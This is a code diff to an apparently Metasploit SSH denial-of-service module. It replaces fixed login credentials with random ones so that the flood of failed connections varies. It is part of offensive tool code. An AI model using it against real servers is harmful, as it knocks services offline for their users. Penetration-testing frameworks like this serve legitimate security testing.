@@ -4,6 +4,8 @@
 # standard modules
 from metasploit import module
 import logging
+import string
+import random
 
 # extra modules
 dependency1_missing = False
@@ -53,6 +55,10 @@ metadata = {
     }
 }
 
+# from modules/auxiliary/dos/http/slowloris.py
+def create_rand_cred(size, seq=string.ascii_uppercase + string.ascii_lowercase):
+    return ''.join(random.choice(seq) for _ in range(size))
+
 def run(args):
     module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
     if dependency1_missing:
@@ -75,9 +81,10 @@ def run(args):
     transport = paramiko.Transport(sock=sock, disabled_algorithms={"kex": ["diffie-hellman-group-exchange-sha1",
                                                                            "diffie-hellman-group14-sha1",
                                                                            "diffie-hellman-group1-sha1"]})
-
+    ssh_uname = create_rand_cred(random.randint(7, 10))
+    ssh_pass = create_rand_cred(random.randint(7, 10))
     try:
-        transport.connect(username="notreal", password="notreal")
+        transport.connect(username=ssh_uname, password=ssh_pass)
     except (paramiko.ssh_exception.SSHException, OSError, paramiko.SSHException):
         logging.info("DoS non-reset attack completed!")
         logging.info("Errors are intended.")
